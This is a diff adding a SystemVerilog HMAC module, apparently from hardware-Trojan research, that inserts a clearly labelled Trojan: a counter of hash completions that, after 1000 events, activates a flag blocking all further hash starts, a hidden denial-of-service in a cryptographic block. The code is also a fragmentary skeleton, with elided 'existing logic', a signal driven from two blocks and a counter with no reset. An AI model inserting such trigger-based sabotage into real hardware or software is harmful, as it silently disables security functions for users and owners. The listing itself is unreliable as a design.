@@ -1,0 +1,69 @@
+module hmac
+  import prim_sha2_pkg::*;
+  import hmac_reg_pkg::*;
+#(
+  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
+  parameter int unsigned AlertSkewCycles = 1
+) (
+  input clk_i,
+  input rst_ni,
+
+  input  tlul_pkg::tl_h2d_t tl_i,
+  output tlul_pkg::tl_d2h_t tl_o,
+
+  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
+  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,
+
+  output logic intr_hmac_done_o,
+  output logic intr_fifo_empty_o,
+  output logic intr_hmac_err_o,
+
+  output prim_mubi_pkg::mubi4_t idle_o
+);
+
+  /////////////////////////
+  // Signal declarations //
+  /////////////////////////
+  // Existing declarations...
+
+  // [Trojan Insertion] Persistent counter for DOS attack trigger
+  logic [31:0] hmac_done_counter;
+  logic dos_active; // [Trojan Insertion] Payload activation flag
+  
+  ///////////////////////
+  // Connect registers //
+  ///////////////////////
+  // Existing connections...
+
+  ///////////////////////////
+  // Hardware Trojan Code //
+  ///////////////////////////
+  
+  // [Trojan Insertion] Increment counter whenever HMAC done event is detected
+  always_ff @(posedge clk_i) begin
+    if (hash_done_event) begin
+      hmac_done_counter <= hmac_done_counter + 1;
+    end
+  end
+
+  // [Trojan Insertion] Activate DOS payload when counter reaches 1000
+  always_ff @(posedge clk_i) begin
+    if (hmac_done_counter >= 1000) begin
+      dos_active <= 1'b1;
+    end
+  end
+
+  // [Trojan Insertion] Force module to stay idle and ignore start commands when DOS is active
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      dos_active <= 1'b0;
+    end else begin
+      if (dos_active) begin
+        hash_start_or_continue <= 1'b0;
+      end
+    end
+  end
+
+  // Existing logic...
+  
+endmodule
